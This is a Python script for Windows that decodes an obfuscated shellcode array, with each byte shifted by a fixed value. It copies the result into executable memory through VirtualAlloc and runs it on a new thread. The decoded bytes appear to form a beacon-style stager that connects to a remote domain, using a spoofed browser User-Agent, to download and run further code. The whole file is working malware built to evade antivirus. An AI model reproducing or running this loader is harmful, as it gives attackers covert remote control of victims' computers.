import ctypes
import time
import random
lShellcode = []
magic = 0x77
shellcode =[0x173,0xbf,0xfa,0x15b,0x167,0x15f,0x13f,0x77,0x77,0x77,0xb8,0xc8,0xb8,0xc7,0xc9,0xc8,0xcd,0xbf,0xa8,0x149,0xdc,0xbf,0x102,0xc9,0xd7,0xbf,0x102,0xc9,0x8f,0xbf,0x102,0xc9,0x97,0xbf,0x102,0xe9,0xc7,0xbf,0x86,0x12e,0xc1,0xc1,0xc4,0xa8,0x140,0xbf,0xa8,0x137,0x123,0xb3,0xd8,0xf3,0x79,0xa3,0x97,0xb8,0x138,0x140,0x84,0xb8,0x78,0x138,0x159,0x164,0xc9,0xb8,0xc8,0xbf,0x102,0xc9,0x97,0x102,0xb9,0xb3,0xbf,0x78,0x147,0xdd,0xf8,0xef,0x8f,0x82,0x79,0xec,0xe9,0x102,0xf7,0xff,0x77,0x77,0x77,0xbf,0xfc,0x137,0xeb,0xde,0xbf,0x78,0x147,0xc7,0x102,0xbf,0x8f,0xbb,0x102,0xb7,0x97,0xc0,0x78,0x147,0x15a,0xcd,0xbf,0x176,0x140,0xb8,0x102,0xab,0xff,0xbf,0x78,0x14d,0xc4,0xa8,0x140,0xbf,0xa8,0x137,0x123,0xb8,0x138,0x140,0x84,0xb8,0x78,0x138,0xaf,0x157,0xec,0x168,0xc3,0x7a,0xc3,0x9b,0x7f,0xbc,0xb0,0x148,0xec,0x14f,0xcf,0xbb,0x102,0xb7,0x9b,0xc0,0x78,0x147,0xdd,0xb8,0x102,0x83,0xbf,0xbb,0x102,0xb7,0x93,0xc0,0x78,0x147,0xb8,0x102,0x7b,0xff,0xbf,0x78,0x147,0xb8,0xcf,0xb8,0xcf,0xd5,0xd0,0xd1,0xb8,0xcf,0xb8,0xd0,0xb8,0xd1,0xbf,0xfa,0x163,0x97,0xb8,0xc9,0x176,0x157,0xcf,0xb8,0xd0,0xd1,0xbf,0x102,0x89,0x160,0xc6,0x176,0x176,0x176,0xd4,0xe1,0x77,0xc0,0x135,0xee,0xe0,0xe5,0xe0,0xe5,0xdc,0xeb,0x77,0xb8,0xcd,0xc0,0x100,0x15d,0xc3,0x100,0x168,0xb8,0x131,0xc3,0xee,0x9d,0x7e,0x176,0x14c,0xbf,0xa8,0x140,0xbf,0xa8,0x149,0xc4,0xa8,0x137,0xc4,0xa8,0x140,0xb8,0xc7,0xb8,0xc7,0xb8,0x131,0xb1,0xcd,0xf0,0x11e,0x176,0x14c,0x160,0x10a,0x77,0x77,0x77,0xd1,0xbf,0x100,0x138,0xb8,0x12f,0x7c,0x7f,0x77,0x77,0xc4,0xa8,0x140,0xb8,0xc8,0xb8,0xc8,0xe1,0x7a,0xb8,0xc8,0xb8,0x131,0xce,0x100,0x116,0x13d,0x176,0x14c,0x162,0xf0,0xd2,0xbf,0x100,0x138,0xbf,0xa8,0x149,0xc0,0x100,0x14f,0xc4,0xa8,0x140,0xc9,0xdf,0x77,0xa9,0x137,0xfb,0xc9,0xc9,0xb8,0x131,0x162,0xcc,0xa5,0xb2,0x176,0x14c,0xbf,0x100,0x13d,0xbf,0xfa,0x13a,0xc7,0xe1,0x81,0xd6,0xbf,0x100,0x168,0x131,0x96,0x77,0x77,0x77,0xe1,0x77,0xdf,0xf7,0xaa,0x77,0x77,0xc0,0x100,0x157,0xb8,0x130,0x7b,0x77,0x77,0x77,0xb8,0x131,0xec,0xbd,0x115,0xfd,0x176,0x14c,0xbf,0x100,0x168,0xbf,0x100,0x151,0xc0,0x13e,0x137,0x176,0x176,0x176,0x176,0xc4,0xa8,0x140,0xc9,0xc9,0xb8,0x131,0xa4,0x7d,0x8f,0xf2,0x176,0x14c,0xfc,0x137,0x86,0xfc,0x114,0x78,0x77,0x77,0xbf,0x176,0x146,0x86,0xfb,0x103,0x78,0x77,0x77,0x162,0x12a,0x160,0x15b,0x78,0x77,0x77,0x15f,0xf9,0x176,0x176,0x176,0xa6,0xd1,0xee,0xcb,0xaf,0x77,0xac,0xc6,0x98,0xc7,0x9c,0xb7,0xb8,0xc7,0xd2,0xab,0xd3,0xc7,0xd1,0xcf,0xac,0xab,0x9f,0xc7,0xd5,0xa0,0xae,0xba,0xba,0xa0,0xae,0xf4,0x9b,0xbc,0xc0,0xba,0xb8,0xc9,0xa4,0xca,0xcb,0xb8,0xc5,0xbb,0xb8,0xc9,0xbb,0xa4,0xb8,0xc5,0xcb,0xc0,0xcd,0xc0,0xc9,0xcc,0xca,0xa4,0xcb,0xbc,0xca,0xcb,0xa4,0xbd,0xc0,0xc3,0xbc,0x98,0x9b,0xbf,0xa2,0xbf,0xa1,0x77,0xac,0xc6,0x98,0xc7,0x9c,0x77,0xcc,0xea,0xdc,0xe9,0xa4,0xb8,0xde,0xdc,0xe5,0xeb,0xb1,0x97,0xc4,0xe6,0xf1,0xe0,0xe3,0xe3,0xd8,0xa6,0xac,0xa5,0xa7,0x97,0x9f,0xda,0xe6,0xe4,0xe7,0xd8,0xeb,0xe0,0xd9,0xe3,0xdc,0xb2,0x97,0xc4,0xca,0xc0,0xbc,0x97,0xa8,0xa7,0xa5,0xa7,0xb2,0x97,0xce,0xe0,0xe5,0xdb,0xe6,0xee,0xea,0x97,0xc5,0xcb,0x97,0xad,0xa5,0xa9,0xb2,0x97,0xce,0xe0,0xe5,0xad,0xab,0xb2,0x97,0xef,0xad,0xab,0xb2,0x97,0xcb,0xe9,0xe0,0xdb,0xdc,0xe5,0xeb,0xa6,0xad,0xa5,0xa7,0xb2,0x97,0xb8,0xca,0xcc,0xa9,0xc1,0xca,0xa0,0x84,0x81,0xbf,0xe6,0xea,0xeb,0xb1,0x97,0xda,0xe6,0xe5,0xdd,0xe9,0xec,0xdc,0xa5,0xf1,0xa8,0xe4,0xaa,0xea,0xa5,0xef,0xf0,0xf1,0x84,0x81,0x77,0xac,0xc6,0x98,0xc7,0x9c,0xb7,0xb8,0xc7,0xd2,0xab,0xd3,0xc7,0xd1,0xcf,0xac,0xab,0x9f,0xc7,0xd5,0xa0,0xae,0xba,0xba,0xa0,0xae,0xf4,0x9b,0xbc,0xc0,0xba,0xb8,0xc9,0xa4,0xca,0xcb,0xb8,0xc5,0xbb,0xb8,0xc9,0xbb,0xa4,0xb8,0xc5,0xcb,0xc0,0xcd,0xc0,0xc9,0xcc,0xca,0xa4,0xcb,0xbc,0xca,0xcb,0xa4,0xbd,0xc0,0xc3,0xbc,0x98,0x9b,0xbf,0xa2,0xbf,0xa1,0x77,0xac,0xc6,0x98,0xc7,0x9c,0xb7,0xb8,0xc7,0xd2,0xab,0xd3,0xc7,0xd1,0xcf,0xac,0xab,0x9f,0xc7,0xd5,0xa0,0xae,0xba,0xba,0xa0,0xae,0xf4,0x9b,0xbc,0xc0,0xba,0xb8,0xc9,0xa4,0xca,0xcb,0xb8,0xc5,0xbb,0xb8,0xc9,0xbb,0xa4,0xb8,0xc5,0xcb,0xc0,0xcd,0xc0,0xc9,0xcc,0xca,0xa4,0xcb,0xbc,0xca,0xcb,0xa4,0xbd,0xc0,0xc3,0xbc,0x98,0x9b,0xbf,0xa2,0xbf,0xa1,0x77,0xac,0xc6,0x98,0xc7,0x9c,0xb7,0xb8,0xc7,0xd2,0xab,0xd3,0xc7,0xd1,0xcf,0xac,0xab,0x9f,0xc7,0xd5,0xa0,0xae,0xba,0xba,0xa0,0xae,0xf4,0x9b,0xbc,0xc0,0xba,0xb8,0xc9,0xa4,0xca,0xcb,0xb8,0xc5,0xbb,0xb8,0xc9,0xbb,0xa4,0xb8,0x77,0xb8,0x135,0x167,0x12c,0x119,0xcd,0x176,0x14c,0xbf,0xa8,0x140,0x131,0x77,0x77,0xb7,0x77,0xb8,0x12f,0x77,0x87,0x77,0x77,0xb8,0x130,0xb7,0x77,0x77,0x77,0xb8,0x131,0xcf,0x11b,0xca,0x15c,0x176,0x14c,0xbf,0x10a,0xca,0xca,0xbf,0x100,0x15e,0xbf,0x100,0x168,0xbf,0x100,0x151,0xb8,0x12f,0x77,0x97,0x77,0x77,0xc0,0x100,0x170,0xb8,0x131,0x89,0x10d,0x100,0x159,0x176,0x14c,0xbf,0xfa,0x13b,0x97,0xfc,0x137,0xeb,0x12d,0xdd,0x102,0x7e,0xbf,0x78,0x13a,0xfc,0x137,0xec,0x14e,0xcf,0xcf,0xcf,0xbf,0x7c,0x77,0x77,0x77,0x77,0xc7,0x13a,0x15f,0xf6,0x174,0x176,0x176,0xda,0xe6,0xe5,0xdd,0xe9,0xec,0xdc,0xa5,0xf1,0xa8,0xe4,0xaa,0xea,0xa5,0xef,0xf0,0xf1,0x77,0x77,0x77,0x77,0x77]
table = random.sample(range(0,len(shellcode)),len(shellcode))

for i in range(len(shellcode)):
    if i % 1000 == 0:
        time.sleep(1)
        #print("sleep")
    shellcode[i] -= magic
shellcode = bytearray(shellcode)
for i in range(len(shellcode)):
    lShellcode.append(shellcode[i])

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

ptr0 = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  
    ctypes.c_int(len(shellcode)*2),  
    ctypes.c_int(0x3000),  
    ctypes.c_int(0x40),  
)
ctypes.windll.kernel32.HeapAlloc.restype = ctypes.c_uint64
ctypes.windll.kernel32.HeapCreate.restype = ctypes.c_uint64

ptr = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x40000),
                                          ctypes.c_int(0),ctypes.c_int(0))
ptr2 = ctypes.windll.kernel32.HeapAlloc(ctypes.c_void_p(ptr),ctypes.c_int(0),ctypes.c_int(0x40000))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.memmove(ctypes.c_void_p(ptr0),buf,ctypes.c_size_t(len(shellcode)))
 
#print("load")

handle = ctypes.windll.kernel32.CreateThread(
    ctypes.pointer(ctypes.c_int(0)),  
    ctypes.c_int(0),  
    ctypes.c_void_p(ptr0),  
    ctypes.pointer(ctypes.c_int(0)),  
    ctypes.c_int(0),  
    ctypes.pointer(ctypes.c_int(0))  
)
#print(handle)
#print("exit")
ret = ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
#print(ret)